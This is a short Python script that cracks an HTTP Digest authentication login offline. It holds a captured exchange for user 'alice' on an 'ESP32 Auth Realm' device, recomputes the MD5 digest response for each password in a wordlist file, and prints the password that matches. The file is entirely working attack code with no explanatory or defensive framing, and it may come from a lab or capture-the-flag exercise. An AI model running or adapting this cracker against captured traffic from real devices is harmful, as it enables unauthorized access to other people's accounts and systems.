import hashlib
username="alice"
realm="ESP32 Auth Realm"
nonce="f71c1a0ee32fe388c45caf821405f2be"
uri="/login"
cnonce="ZmIxYjU2ZmZjMzYyZWM2NzhkYThhOTAzYjI2N2NlMGE="
nc="00000001"
qop="auth"
response="8c806a5a42f69c674ccbaa7e8de87b4a"
opaque="0eccb6e4b80a9ea569a5a5b5984dc185"


with open('dico.txt', 'r') as mon_dico:
    for line in mon_dico:
        mdp = str(line)[:-1]
        hash1 = username+":"+realm+":"+mdp
        hash11 = hashlib.md5(hash1.encode())
        hash111 = hash11.hexdigest()
        #--------#
        hash2 = "GET:"+uri
        hash22 = hashlib.md5(hash2.encode())
        hash222 = hash22.hexdigest()
        #--------#
        hash3 = hash111+":"+nonce+":"+nc+":"+cnonce+":"+qop+":"+hash222
        hash33 = hashlib.md5(hash3.encode())
        hash333= hash33.hexdigest()
        #print(" result :"+hash333)
        #--------#
        if hash333==response:
            print("Right Login/Password : "+mdp)
            break
 #       else:
#            print("||||"+mdp+"|||||")







